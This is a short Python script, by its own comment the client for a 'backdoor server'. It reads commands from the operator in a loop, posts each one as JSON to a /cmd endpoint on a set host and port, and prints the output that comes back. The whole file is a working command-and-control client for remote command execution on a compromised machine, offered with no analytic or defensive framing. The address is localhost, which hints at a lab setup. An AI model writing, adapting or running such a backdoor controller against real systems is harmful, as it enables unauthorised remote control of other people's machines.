#!/usr/bin/env python3

# Used to send commands to the backdoor server and receive output.

import requests, json

IP_ADDR = "127.0.0.1"
PORT = 777

def main():
    while True:
        try:
            command = input("Enter command to execute (or 'exit' to quit): ")
            if command.lower() == 'exit':
                break
            url = f"http://{IP_ADDR}:{PORT}/cmd"
            headers = {'Content-Type': 'application/json'}
            payload = json.dumps({'command': command})
            response = requests.post(url, headers=headers, data=payload)
            if response.status_code == 222:
                print("Command Output:\n\n" + response.text)
            else:
                print("Error:", response.status_code, response.text)
        except requests.exceptions.RequestException as e:
            print("Request failed:", e)



if __name__ == "__main__":
    main()